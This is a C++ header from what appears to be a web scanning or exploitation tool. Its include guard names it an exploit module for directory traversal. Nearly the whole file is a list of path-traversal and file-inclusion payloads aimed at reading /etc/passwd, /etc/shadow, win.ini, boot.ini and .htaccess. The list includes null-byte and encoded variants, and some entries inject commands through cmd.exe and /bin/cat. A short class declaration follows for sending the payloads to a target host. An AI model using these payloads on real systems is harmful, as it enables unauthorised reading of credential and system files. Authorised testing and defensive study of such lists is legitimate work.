#ifndef INCLUDE_EXPLOIT_DIR_TRAVERSAL_H_
#define INCLUDE_EXPLOIT_DIR_TRAVERSAL_H_

#include <iostream>
#include <fstream>
#include "../utils.h"
#include "Sock.h"
#include "XMLparser.h"
#include "pos_thread.h"

static std::vector<std::string> file_inclusion_query = {
		  "?file=../../etc/passwd",
		  "?file=../../../../../../../../../etc/passwd",
          "?file=../../../../../../../../etc/passwd",
          "?file=../../../../../../../etc/passwd",
          "?file=../../../../../../etc/passwd",
          "?file=../../../../../etc/passwd",
          "?file=../../../../etc/passwd",
		  "?file=../../../etc/passwd",
           "?file=..\\WINDOWS\\win.ini",
		   "?file=\\..\\..\\WINDOWS\\win.ini",
		   "?file=\\..\\..\\..\\WINDOWS\\win.ini",
		   "?file=\\..\\..\\..\\..\\WINDOWS\\win.ini",
		   "?file=.\\..\\..\\..\\..\\WINDOWS\\win.ini",
		   "?file=\\..\\..\\..\\..\\..\\..\\WINDOWS\\win.ini",
		   "?file=../../../.htaccess",
            "?file=../../.htaccess",
             "?file=../.htaccess",
             "?file=.htaccess",
             "?file=././.htaccess",
			 "?file=..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\",
             "?file=..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\",
             "?file=..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\",
             "?file=..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\",
             "?file=..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\",
             "?file=..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\",
             "?file=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\",
			 "?file=../../../../../../../../../../../../etc/hosts%00",
			 "?file../../../../../../../../../../../../etc/hosts",
			 "?file=../../boot.ini",
			 "?file=/../../../../../../../../%2A",
			 "?file=../../../../../../../../../../../../etc/passwd%00",
			 "?file=../../../../../../../../../../../../etc/passwd",
			 "?file=../../../../../../../../../../../../etc/shadow%00",
			 "?file=../../../../../../../../../../../../etc/shadow",
			 "?file=/../../../../../../../../../../etc/passwd^^",
			 "?file=/../../../../../../../../../../etc/shadow^^",
			 "?file=/../../../../../../../../../../etc/passwd",
			 "?file=/../../../../../../../../../../etc/shadow",
			 "?file=/./././././././././././etc/passwd",
			 "?file=/./././././././././././etc/shadow",
			 "?file=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
			 "?file=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow",
			 "?file=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
			 "?file=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow",
			 "?file=/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd",
			 "?file=/..\\../..\\../..\\../..\\../..\\../..\\../etc/shadow",
			 "?file=.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
			 "?file=.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow",
			  "?file=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00",
			 "?file=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow%00",
			 "?file=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00",
			 "?file=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow%00",
			 "?file=%0a/bin/cat%20/etc/passwd",
			 "?file=%0a/bin/cat%20/etc/shadow",
			 "?file=%00/etc/passwd%00",
			 "?file=%00/etc/shadow%00",
			 "?file=%00../../../../../../etc/passwd",
			 "?file=%00../../../../../../etc/shadow",
			 "?file=/../../../../../../../../../../../etc/passwd%00.jpg",
			 "?file=/../../../../../../../../../../../etc/passwd%00.html",
			 "?file=../etc/passwd",
			 "?file=../etc/issue",
			 "?file=../boot.ini",
			 "?file=../windows/system32/drivers/etc/hosts",
			 "?file=../../etc/passwd",
			 "?file=../../etc/issue",
			 "?file=../../boot.ini",
			 "?file=../../windows/system32/drivers/etc/hosts",
			 "?file=../../../etc/passwd",
			 "?file=../../../etc/issue",
			 "?file=../../../boot.ini",
			 "?file=../../../windows/system32/drivers/etc/hosts",
			 "?file=../../../../etc/passwd",
			 "?file=../../../../etc/issue",
			 "?file=../../../../boot.ini",
			 "?file=../../../../windows/system32/drivers/etc/hosts",
			 "?file=../../../../../etc/passwd",
			 "?file=../../../../../etc/issue",
			 "?file=../../../../../boot.ini",
			 "?file=../../../../../windows/system32/drivers/etc/hosts",
			 "?file=../../../../../../etc/passwd",
			 "?file=../../../../../../etc/issue",
			 "?file=../../../../../../boot.ini",
			 "?file=../../../../../../windows/system32/drivers/etc/hosts",
			 "?file=..\\etc\\passwd",
			 "?file=..\\etc\\issue",
			 "?file=..\\boot.ini",
			 "?file=..\\windows\\system32\\drivers\\etc\\hosts",
			 "?file=..\\..\\etc\\passwd",
			 "?file=..\\..\\etc\\issue",
			 "?file=..\\..\\boot.ini",
			 "?file=..\\..\\windows\\system32\\drivers\\etc\\hosts",
			 "?file=..\\..\\..\\etc\\passwd",
			 "?file=..\\..\\..\\etc\\issue",
			 "?file=..\\..\\..\\boot.ini",
			 "?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			 "?file=..\\..\\..\\..\\etc\\passwd",
			 "?file=..\\..\\..\\..\\etc\\issue",
			 "?file=..\\..\\..\\..\\boot.ini",
			 "?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			 "?file=..\\..\\..\\..\\..\\etc\\passwd",
			 "?file=..\\..\\..\\..\\..\\etc\\issue",
			 "?file=..\\..\\..\\..\\..\\boot.ini",
			 "?file=..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			 "?file=..\\..\\..\\..\\..\\..\\etc\\passwd",
			 "?file=..\\..\\..\\..\\..\\..\\etc\\issue",
			 "?file=..\\..\\..\\..\\..\\..\\boot.ini",
			 "?file=..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
};

class DIR_TRAVERSAL{
	private:
			std::string hostname;
			int PORT;
	public: DIR_TRAVERSAL(std::string hostname, int PORT);
			void directory_traversal(std::string page_path);
};
void dir_check(std::string &, int, int);

#endif /* INCLUDE_EXPLOIT_DIR_TRAVERSAL_H_ */
